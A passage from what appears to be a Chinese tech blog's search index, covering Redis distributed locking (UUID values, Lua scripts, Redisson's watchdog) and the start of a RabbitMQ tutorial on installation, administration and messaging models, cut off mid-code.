SECONDS</code>,NX表示上锁，EX表示过期时间，避免死锁</p>\n<h4 id=\"误删问题\"><a href=\"#误删问题\" class=\"headerlink\" title=\"误删问题\"></a>误删问题</h4><p>仅仅使用上述命令，对同一个资源进行读写时，对资源上锁,比如秒杀系统中苹果手机数量</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//SET lock:iphone 1 NX EX 30 # 1表示有锁</span></span><br><span class=\"line\">String gid = <span class=\"string\">&quot;goods:&quot;</span>+id;</span><br><span class=\"line\"><span class=\"comment\">//1表示上锁</span></span><br><span class=\"line\">Boolean isLock = redisTemplate.opsForValue().setIfAbsent(gid, <span class=\"number\">1</span>, <span class=\"number\">30</span>, TimeUnit.SECONDS);</span><br><span class=\"line\"><span class=\"comment\">//获取到锁了</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(isLock)&#123;</span><br><span class=\"line\">    <span class=\"comment\">//并发操作</span></span><br><span class=\"line\">    <span class=\"comment\">//操作变量</span></span><br><span class=\"line\">    <span class=\"comment\">//解锁</span></span><br><span class=\"line\">    redisTemplate.delete(gid)；</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//自旋重试</span></span><br><span class=\"line\">    <span class=\"comment\">//其他操作</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n\n<p>那么后续线程进入再次执行发现isLock，返回false表示获得锁失败，开始自旋</p>\n<p>但是这样有一个问题：如果线程a进入获得锁后，由于服务器卡顿或其他原因，锁已经超时了但是业务还没执行完，由于锁被释放了，b线程进入，进行业务操作，这是a执行完毕尝试释放锁，这时候释放的锁是b线程上的。</p>\n<p>也就是说a释放了b的锁，要想解决这个问题必须明确一点，释放锁之前必须判断该锁是不是自己上的，这时候可以利用redis中空余的value作文章了，生成一个随机的uuid值作为value，解锁前判断uuid是否一致</p>\n<p>修改代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">String uuid = UUID.randomUUID().toString();</span><br><span class=\"line\">String gid = <span class=\"string\">&quot;goods:&quot;</span>+id;</span><br><span class=\"line\"><span class=\"comment\">//1表示上锁</span></span><br><span class=\"line\">Boolean isLock = redisTemplate.opsForValue().setIfAbsent(gid, uuid, <span class=\"number\">30</span>, TimeUnit.SECONDS);</span><br><span class=\"line\"><span class=\"comment\">//获取到锁了</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(isLock)&#123;</span><br><span class=\"line\">    <span class=\"comment\">//并发操作</span></span><br><span class=\"line\">    <span class=\"comment\">//操作变量</span></span><br><span class=\"line\">    <span class=\"comment\">//解锁</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>((String)redisTemplate.opsForValue().get(gid).equals(uuid))&#123;</span><br><span class=\"line\">      redisTemplate.delete(gid);  </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//自旋重试</span></span><br><span class=\"line\">    <span class=\"comment\">//其他操作</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"原子性问题\"><a href=\"#原子性问题\" class=\"headerlink\" title=\"原子性问题\"></a>原子性问题</h4><p>在判断是否相同后，判断相同，查询返回的uuid确实与生成的uuid一致，但是在执行删除之前，刚好过期，锁被释放。判断与删除的操作缺乏原子性</p>\n<p>解决方案：lua脚本，类似redis事务，有一定的原子性，不会被其他命令插队，可以完成一些redis事务性的操作。</p>\n<p>把判断删除代码修改如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">String script = <span class=\"string\">&quot;if redis.call(&#x27;get&#x27;,KEYS[1])==ARGV[1] then return reids.call(&#x27;del&#x27;,KEYS[1]) else return 0 end&quot;</span>;</span><br><span class=\"line\">DefaultRedisScript&lt;Long&gt; redisScript = <span class=\"keyword\">new</span> DefaultRedisScript&lt;&gt;();</span><br><span class=\"line\">redisScript.setScriptText(script);</span><br><span class=\"line\"><span class=\"comment\">//设置返回类型，默认返回String类型</span></span><br><span class=\"line\">redisScript.setResultType(Long.class);</span><br></pre></td></tr></table></figure>\n\n\n\n<p>为了防止锁在没完成业务之前就释放，需要帮锁续命，开启子线程检测锁是否快过期，如果是则增加生存时间</p>\n<p><strong>基于复杂的操作与分支，有人已经造好了轮子–redisson–成熟的分布式锁解决方案</strong></p>\n<h3 id=\"redisson实现\"><a href=\"#redisson实现\" class=\"headerlink\" title=\"redisson实现\"></a>redisson实现</h3><p>Redisson封装好所有的细节调用方法如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">RLock lock = redisson.getLock(lockKey);</span><br><span class=\"line\">lock.lock();</span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">   <span class=\"comment\">//业务逻辑</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">    lock.unlock();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>源码追踪</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//调用链</span></span><br><span class=\"line\">lock.lock();</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.lockInterruptibly();</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>.lockInterruptibly(-<span class=\"number\">1L</span>, (TimeUnit)<span class=\"keyword\">null</span>);</span><br><span class=\"line\">\t\t\t\tLong ttl = <span class=\"keyword\">this</span>.tryAcquire(leaseTime, unit, threadId);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> (Long)<span class=\"keyword\">this</span>.get(<span class=\"keyword\">this</span>.tryAcquireAsync(leaseTime, unit, threadId));</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.tryLockInnerAsync(leaseTime, unit, threadId, RedisCommands.EVAL_LONG);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//通过lua脚本保证原子性</span></span><br><span class=\"line\">    &lt;T&gt; <span class=\"function\">RFuture&lt;T&gt; <span class=\"title\">tryLockInnerAsync</span><span class=\"params\">(<span class=\"keyword\">long</span> leaseTime, TimeUnit unit, <span class=\"keyword\">long</span> threadId, RedisStrictCommand&lt;T&gt; command)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.internalLockLeaseTime = unit.toMillis(leaseTime);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.commandExecutor.evalWriteAsync(<span class=\"keyword\">this</span>.getName(), LongCodec.INSTANCE, command,                                                                                            </span><br><span class=\"line\">         <span class=\"string\">&quot;if (redis.call(&#x27;exists&#x27;, KEYS[1]) == 0) then redis.call(&#x27;hset&#x27;, KEYS[1], ARGV[2], 1); redis.call(&#x27;pexpire&#x27;, KEYS[1], ARGV[1]); return nil; end; if (redis.call(&#x27;hexists&#x27;, KEYS[1], ARGV[2]) == 1) then redis.call(&#x27;hincrby&#x27;, KEYS[1], ARGV[2], 1); redis.call(&#x27;pexpire&#x27;, KEYS[1], ARGV[1]); return nil; end; return redis.call(&#x27;pttl&#x27;, KEYS[1]);&quot;</span>, </span><br><span class=\"line\">                                                   Collections.singletonList(<span class=\"keyword\">this</span>.getName()), <span class=\"keyword\">new</span> Object[]&#123;<span class=\"keyword\">this</span>.internalLockLeaseTime, <span class=\"keyword\">this</span>.getLockName(threadId)&#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"comment\">//通过uuid+线程名作为value，保证了value的唯一</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220610191819840.png\" alt=\"image-20220610191819840\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220610191916053.png\" alt=\"image-20220610191916053\"></p>\n<ul>\n<li>看门狗机制，上锁后每隔一定时间就会帮锁续命（避免死锁且防止业务未完成就释放了锁）</li>\n</ul>\n<h2 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h2><ul>\n<li>冷热分离，设置过期时间</li>\n<li>过期时间要随机，防止大量数据同时过期引起缓存雪崩</li>\n<li>读延期，再次读到缓存为值续命</li>\n<li>缓存空值  </li>\n<li>分布式锁防止大量重建缓存，保证只有一个应用构建缓存</li>\n<li>dcl双检测缓存</li>\n<li>利用jvm内存作多级存储减轻压力，比如hashmap，或者guava等框架。但是要注意要防止jvm占用内存过大</li>\n</ul>\n","categories":["java"]},{"title":"RabbitMQ教程","url":"/p/65036/","content":"<h1 id=\"RabbitMQ实战教程\"><a href=\"#RabbitMQ实战教程\" class=\"headerlink\" title=\"RabbitMQ实战教程\"></a>RabbitMQ实战教程</h1><h2 id=\"MQ引言\"><a href=\"#MQ引言\" class=\"headerlink\" title=\"MQ引言\"></a>MQ引言</h2><h3 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>MQ(Message Queue):翻译为消息队列，通过典型的生产者和消费者模型，生产者不断向消息队列中生产消息，消费者不断的从队列中获取消息。因为消息的生产和消费都是异步的，而且只关心消息的发送和接收，没有业务逻辑的侵入，轻松实现了系统间解耗。别名为消息中间件，通过利用高效可靠的消息传递机制进行平台无关的数据交流，并基于数据通信，来进行分布式系统的集成。</p>\n<p>应用场景：</p>\n<ul>\n<li>应用解耦</li>\n<li>异步处理</li>\n<li>流量削峰</li>\n</ul>\n<p>缺点:</p>\n<ul>\n<li>系统可用性降低</li>\n<li>系统复杂度提高</li>\n<li>一致性问题</li>\n</ul>\n<h3 id=\"主流MQ\"><a href=\"#主流MQ\" class=\"headerlink\" title=\"主流MQ\"></a>主流MQ</h3><p>当今市面上有很多主流的消息中间件，如老牌的<code>ActiviMQ</code>、<code>RabbitMQ</code>,炙手可热的<code>Kafka</code>，阿里巴巴自主研发的<code>RocketMQ</code></p>\n<p><strong>对比</strong></p>\n<table>\n<thead>\n<tr>\n<th>特性</th>\n<th>ActiveMQ</th>\n<th>RabbitMQ</th>\n<th>RocketMQ</th>\n<th>Kafka</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>单机吞吐量</td>\n<td>万级，比 RocketMQ、Kafka 低一个数量级</td>\n<td>同左</td>\n<td>10 万级，支撑高吞吐</td>\n<td>10万级，高吞吐，一般配合大数据库类的系统进行实时数据计算和日志采集</td>\n</tr>\n<tr>\n<td>topic数量对吞吐量影响</td>\n<td></td>\n<td></td>\n<td>topic达到几百几千时，吞吐量会有较小幅度的下降，同等机器下可以支撑大量的topic</td>\n<td>topic 从几十到几百个时候，吞吐量会大幅度下降，在同等机器下，Kafka 尽量保证 topic 数量不要过多，如果要支撑大规模的 topic，需要增加更多的机器资源</td>\n</tr>\n<tr>\n<td>时效性</td>\n<td>ms级</td>\n<td>μs级别，延迟最低</td>\n<td>ms级别</td>\n<td>ms级别</td>\n</tr>\n<tr>\n<td>可用性</td>\n<td>高，基于主从架构实现高可用</td>\n<td>同左</td>\n<td>非常高，分布式架构</td>\n<td>非常高，分布式，一个数据多个副本，少数机器宕机不会丢失数据，不会导致不可用</td>\n</tr>\n<tr>\n<td>消息可靠性</td>\n<td>较低概率丢失数据</td>\n<td>基本不丢</td>\n<td>参数优化配置后可以0丢失</td>\n<td>同RocketMQ</td>\n</tr>\n<tr>\n<td>功能支持</td>\n<td>功能极其完备</td>\n<td>基于erlang开发，并发能力很强，性能好，延迟第</td>\n<td>功能完善，分布式易于拓展</td>\n<td>功能较为简单，主要支持简单MQ，在大数据领域的实时计算以及日志采集被大规模使用</td>\n</tr>\n</tbody></table>\n<p>RabbitMQ比Kafka可靠，Kafka更适合IO高吞吐的处理，一般应用在大数据日志处理或对实时性（少量延迟）,可靠性（少量丢数据）要求稍低的场景使用，比如ELK日志收集。</p>\n<h2 id=\"安装过程\"><a href=\"#安装过程\" class=\"headerlink\" title=\"安装过程\"></a>安装过程</h2><ol>\n<li>通过yum或者apt-get等包管理工具下载<code>erlang</code>以及<code>rabbitmq-server</code></li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 需要注意版本是否对应：https://www.rabbitmq.com/which-erlang.html#intro</span></span><br><span class=\"line\">yum install -y erlang</span><br><span class=\"line\">yum install -y rabbitmq-server</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>通过<code>rabbitmq-plugins</code>配置插件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">rabbitmq-plugins <span class=\"built_in\">enable</span> rabbitmq_management  rabbitmq_web_dispatch amqp_client rabbitmq_management_agent</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>添加用户并为用户添加权限</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 添加用户</span></span><br><span class=\"line\">rabbitmqctl add_user username password</span><br><span class=\"line\"><span class=\"comment\"># 查看当前用户</span></span><br><span class=\"line\">rabbitmqctl list_users</span><br><span class=\"line\"><span class=\"comment\"># 添加角色为管理员</span></span><br><span class=\"line\">rabbitmqctl set_user_tags username administrator</span><br><span class=\"line\"><span class=\"comment\"># 添加用户权限</span></span><br><span class=\"line\">rabbitmqctl set_permissions -p / username <span class=\"string\">&quot;.*&quot;</span> <span class=\"string\">&quot;.*&quot;</span> <span class=\"string\">&quot;.*&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 查看指定用户的权限</span></span><br><span class=\"line\">rabbitmqctl  list_user_permissions admin</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>启动rabbitmq并设置开机自启动</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl start rabbitmq-server</span><br><span class=\"line\"><span class=\"comment\"># 或者service rabbitmq-server start</span></span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> rabbitmq-server</span><br><span class=\"line\">systemctl status rabbitmq-server</span><br><span class=\"line\">systemcty restart rabbitmq-server</span><br></pre></td></tr></table></figure>\n\n\n\n<p>5.如果有需要可以修改<code>/etc/rabbitmq</code>下的配置文件<code>rabbitmq.conf</code>,配置文件的语法继承于erlang语言，有点类似json,新的3.7版本以上配置文件开始使用sysctl格式</p>\n<p>在Linux使用二进制安装rabbitmq3.8版本，默认没有配置文件。需要自己创建文件放上去。</p>\n<p>rabbitmq-env.conf主要配置rabbitmq的环境变量的，如配置rabbitmq.conf和advanced.config文件的地址。</p>\n<p>rabbitmq.conf主要配置RabbitMQ服务器和插件。</p>\n<p>advanced.config：配置设置不可能或难以使用sysctl格式进行配置。因此，可以使用Erlang术语格式的其他配置文件（与rabbitmq.config相同）。该文件通常命名为advanced.config。它将与Rabbitmq.conf中提供的配置合并。</p>\n<p>以下是三个配置文件示例的链接：</p>\n<p>1、rabbitmq.conf</p>\n<p><a href=\"https://www.cnblogs.com/masy-lucifer/p/13551090.html\">https://www.cnblogs.com/masy-lucifer/p/13551090.html</a></p>\n<p>2、advanced.conf</p>\n<p><a href=\"https://www.cnblogs.com/masy-lucifer/p/13551106.html\">https://www.cnblogs.com/masy-lucifer/p/13551106.html</a></p>\n<p>3、rabbitmq-env.conf</p>\n<h2 id=\"Rabbitmq管理\"><a href=\"#Rabbitmq管理\" class=\"headerlink\" title=\"Rabbitmq管理\"></a>Rabbitmq管理</h2><h3 id=\"命令行管理\"><a href=\"#命令行管理\" class=\"headerlink\" title=\"命令行管理\"></a>命令行管理</h3><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 服务启动相关</span>\t</span><br><span class=\"line\">systemctl start|restart|stop|status rabbitmq-server</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 所有管理命令查询</span></span><br><span class=\"line\">rabbitmqctl help</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查看所有插件启用或禁用</span></span><br><span class=\"line\">rabbitmq-plugins enable|disable|list</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"web页面管理\"><a href=\"#web页面管理\" class=\"headerlink\" title=\"web页面管理\"></a>web页面管理</h3><p>默认的登录账号密码都为guest，如果无法远程登录，需要启用配置文件的[loopback_users,{}]，实在不行就在本地命令行添加新用户，添加角色并授权。</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220613080424730.png\" alt=\"image-20220613080424730\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220613081517282.png\" alt=\"image-20220613081517282\"></p>\n<blockquote>\n<p>connections：无论生产者还是消费者，都需要与RabbitMQ建立连接后才可以完成消息的生产和消费，在这里可以查看连接情况</p>\n<p>channels：通道，建立连接后，会形成通道，消息的投递获取依赖通道。</p>\n<p>Exchanges：交换机，用来实现消息的路由</p>\n<p>Queues：队列，即消息队列，消息存放在队列中，等待消费，消费后被移除队列。</p>\n</blockquote>\n<h4 id=\"用户角色的区别：\"><a href=\"#用户角色的区别：\" class=\"headerlink\" title=\"用户角色的区别：\"></a>用户角色的区别：</h4><ul>\n<li>超级管理员(administrator)</li>\n</ul>\n<p>可登陆管理控制台，可查看所有的信息，并且可以对用户，策略(policy)进行操作</p>\n<ul>\n<li>监控者(monitoring)</li>\n</ul>\n<p>可登陆管理控制台，同时可以查看rabbitmq节点的相关信息(进程数，内存使用情况，磁盘使用情况等)</p>\n<ul>\n<li>策略制定者(policymaker)</li>\n</ul>\n<p>可登陆管理控制台, 同时可以对policy进行管理。但无法查看节点的相关信息</p>\n<ul>\n<li>普通管理者(management)</li>\n</ul>\n<p>仅可登陆管理控制台，无法看到节点信息，也无法对策略进行管理。</p>\n<ul>\n<li>其他</li>\n</ul>\n<p>无法登陆管理控制台，通常就是普通的生产者和消费者。</p>\n<h4 id=\"虚拟主机\"><a href=\"#虚拟主机\" class=\"headerlink\" title=\"虚拟主机\"></a>虚拟主机</h4><p>为了让各个用户可以互不干扰的工作，RabbitMQ添加了虚拟主机（Virtual Hosts）的概念。其实就是一个独立的访问路径，不同用户使用不同路径，各自有自己的队列、交换机，互相不会影响。相当于关系型中的数据库。添加完虚拟主机要给对应的用户绑定上，只有绑定了虚拟主机的用户才可以看到相关的队列交换机等信息</p>\n<h2 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h2><p>依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.rabbitmq<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>amqp-client<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"第一种模型（直连）\"><a href=\"#第一种模型（直连）\" class=\"headerlink\" title=\"第一种模型（直连）\"></a>第一种模型（直连）</h3><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220613084536069.png\" alt=\"image-20220613084536069\"></p>\n<h4 id=\"参数细节\"><a href=\"#参数细节\" class=\"headerlink\" title=\"参数细节\"></a>参数细节</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//通道绑定对应消息队列</span></span><br><span class=\"line\"><span class=\"comment\">//参数1:队列名称如果队列不存在自动创建</span></span><br><span class=\"line\"><span class=\"comment\">//参数2:用来定义队列特性是否要持久化 true 持久化队列 false 不持久化，同时需要在下面设置消息持久化</span></span><br><span class=\"line\"><span class=\"comment\">//参数3:exclusive是否独占列列true独占队列,false不独占(连接独占)</span></span><br><span class=\"line\"><span class=\"comment\">//参数4:autoDelete:是否在消费完成且没有连接后自动删除队列</span></span><br><span class=\"line\"><span class=\"comment\">//参数5:额外附加参数</span></span><br><span class=\"line\">channel.queueDeclare(queue:<span class=\"string\">&quot;aa&quot;</span>,durable:<span class=\"keyword\">true</span>,exclusive:<span class=\"keyword\">false</span>,autoDelete:<span class=\"keyword\">true</span>,arquments:<span class=\"keyword\">null</span>);</span><br><span class=\"line\"><span class=\"comment\">//发布消息</span></span><br><span class=\"line\"><span class=\"comment\">//参数1:交换机名称参数</span></span><br><span class=\"line\"><span class=\"comment\">//参数2:队列名称参数</span></span><br><span class=\"line\"><span class=\"comment\">//参数3:传递消息额外设置参数，比如消息持久化</span></span><br><span class=\"line\"><span class=\"comment\">//参数4:消息的具体内容</span></span><br><span class=\"line\">channel.basicpublish(exchange:<span class=\"string\">&quot;&quot;</span>,routingKey:<span class=\"string\">&quot;aa&quot;</span>,MessageProperties.PERSISTENT_TEXT_PLAIN,message.getBytes());</span><br><span class=\"line\"><span class=\"comment\">//消费者与生产者队列设置需要相同，同时队列若存在设置不同参数不会覆盖，会报错</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//参数1:队列名称 参数2:消息自动确认 参数3:消息回调</span></span><br><span class=\"line\">channel.basicConsume(<span class=\"string\">&quot;hello&quot;</span>,<span class=\"keyword\">true</span>,<span class=\"keyword\">new</span> DefaultConsumer(channel)&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">handleDelivery</span><span class=\"params\">(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, <span class=\"keyword\">byte</span>[] body)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">        String s = <span class=\"keyword\">new</span> String(body);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;consumer获取到的消息是: &quot;</span>+s);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"第二种模型-work-queue\"><a href=\"#第二种模型-work-queue\" class=\"headerlink\" title=\"第二种模型(work queue)\"></a>第二种模型(work queue)</h3><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220613084806721.png\" alt=\"image-20220613084806721\"></p>\n<p>只需要在模型一的基础上增加消费者</p>\n<p>总结：默认情况下，RabbitMQ按顺序将每个消息发送给下一个使用者。平均而言，每个消费者都会收到相同数量的消息。这种分发消息的方式称为循环</p>\n<h4 id=\"消息确认机制\"><a href=\"#消息确认机制\" class=\"headerlink\" title=\"消息确认机制\"></a>消息确认机制</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">channel.basicConsume(<span class=\"string\">&quot;hello&quot;</span>,<span class=\"keyword\">true</span>,consumer）</span><br></pre></td></tr></table></figure>\n\n\n\n<p>消费者中如果自动确认为true,消费者不会管回调是否操作完，只会一直获取消息，因此多个消费者的情况下会平均分配。不建议使用自动确认可以通过basicQos设置每次获取的消息，直到处理完才获取下一个。保证了队列按照处理效率获取消息。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//一次只接收一条未确认的消息</span></span><br><span class=\"line\">channel.basicQos(<span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"comment\">//手动确认 参数1:手动确认消息标识  参数2:false 每次确认一个</span></span><br><span class=\"line\">channel.basicAck(envelope.getDeliveryTag(),<span class=\"keyword\">false</span>);</span><br><span class=\"line\"><span class=\"comment\">//basicQos设置了每次获取的消息，每回调完一次后就会手动确认</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>前两种模型用了默认的交换机，默认交换机把消息发送到与routinkey名称相同的队列</p>\n<h3 id=\"第三种模型-publish-subscribe\"><a href=\"#第三种模型-publish-subscribe\" class=\"headerlink\" title=\"第三种模型(publish/subscribe)\"></a>第三种模型(publish/subscribe)</h3><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220613095727750.png\" alt=\"image-20220613095727750\"></p>\n<p>使用场景:登录后的并发操作</p>\n<p>生产者</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//生产者通过channel先声明交换机(包括名字与模式)，</span></span><br><span class=\"line\"><span class=\"comment\">//把消息发送到这个交换机上，由交换机负责路由分发</span></span><br><span class=\"line\">Connection connection = RabbitmqUtil.getConnection();</span><br><span class=\"line\">Channel channel = connection.createChannel();</span><br><span class=\"line\"><span class=\"comment\">//通道声明交换机 参数1:交换机的名称   参数2:交换机的类型</span></span><br><span class=\"line\">channel.exchangeDeclare(<span class=\"string\">&quot;logs&quot;</span>, <span class=\"string\">&quot;fanout&quot;</span>);</span><br><span class=\"line\">channel.basicPublish(<span class=\"string\">&quot;logs&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"keyword\">null</span>,<span class=\"string\">&quot;fan out&quot;</span>.getBytes(StandardCharsets.UTF_8));</span><br></pre></td></tr></table></figure>\n\n<p>消费者</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//消费者通过channel先声明交换机(包括名字与模式)，</span></span><br><span class=\"line\"><span class=\"comment\">//然后使用channel获取临时队列的queue，</span></span><br><span class=\"line\"><span class=\"comment\">//最后通过队列绑定到交换机上，然后消费者就可以从队列中获取消息并消费</span></span><br><span class=\"line\">Connection connection = RabbitmqUtil.getConnection();</span><br><span class=\"line\">Channel channel = connection.createChannel();</span><br><span class=\"line\"><span class=\"comment\">//通道绑定队列</span></span><br><span class=\"line\">channel.exchangeDeclare(<span class=\"string\">&quot;logs&quot;</span>,<span class=\"string\">&quot;fanout&quot;</span>);</span><br><span class=\"line\">String queue = channel.queueDeclare().getQueue();</span><br><span class=\"line\">channel.queueBind(queue,<span class=\"string\">&quot;logs&quot;</span>,<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">channel.basicConsume(queue, <span class=\"keyword\">true</span>,<span class=\"keyword\">new</span> DefaultConsumer(channel)&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">handleDelivery</span><span class=\"params\">(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, <span class=\"keyword\">byte</span>[] body)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;cousumer1: &quot;</span>+<span class=\"keyword\">new</span> String(body));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p><strong>其实广播模式下将队列绑定到交换机没必要</strong></p>\n<h3 id=\"第四种模型-Routing的direct\"><a href=\"#第四种模型-Routing的direct\" class=\"headerlink\" title=\"第四种模型(Routing的direct)\"></a>第四种模型(Routing的direct)</h3><h4 id=\"direct\"><a href=\"#direct\" class=\"headerlink\" title=\"direct\"></a>direct</h4><p>与第三种类似，区别是第三种属于广播，所有的队列都能接收到消息，第四种中只有特定的队列能接收到消息(根据RoutingKey区分)</p>\n<p>用法</p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\"># 1.设置交换机的模式为direct</span></span><br><span class=\"line\"><span class=\"section\"># 2.发送设置RoutingKey</span></span><br><span class=\"line\"><span class=\"section\"># 3.队列绑定channel时设置队列的RoutingKey</span></span><br></pre></td></tr></table></figure>\n\n<p>一个channel可以绑定多个队列(也就是说一个channel可以设置多个RoutingKey)</p>\n<h3 id=\"第五种模型-Routing的topic\"><a href=\"#第五种模型-Routing的topic\" class=\"headerlink\" title=\"第五种模型(Routing的topic)\"></a>第五种模型(Routing的topic)</h3><h4 id=\"topic\"><a href=\"#topic\" class=\"headerlink\" title=\"topic\"></a>topic</h4><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220613134524394.png\" alt=\"image-20220613134524394\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220613134718635.png\" alt=\"image-20220613134718635\"></p>\n<h2 id=\"整合Springboot\"><a href=\"#整合Springboot\" class=\"headerlink\" title=\"整合Springboot\"></a>整合Springboot</h2><p><strong>强烈建议参考<a href=\"https://blog.csdn.net/weixin_44837750/article/details/119877736\">大神的总结</a></strong></p>\n<h3 id=\"关系设置\"><a href=\"#关系设置\" class=\"headerlink\" title=\"关系设置\"></a>关系设置</h3><blockquote>\n<p>queue,exchange,binding可以不使用注解，通过其他方式声明</p>\n</blockquote>\n<p>方法一：通过RabbitAdmin管理员类配置，该类实现了AmqpAdmin接口，也是唯一实现。这个接口定义了队列、交换机以及路由key绑定的设置与移除方法。代码实例如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Autowired</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">getLog</span><span class=\"params\">(AmqpAdmin amqpAdmin)</span> </span>&#123;</span><br><span class=\"line\">    DirectExchange directExchange = <span 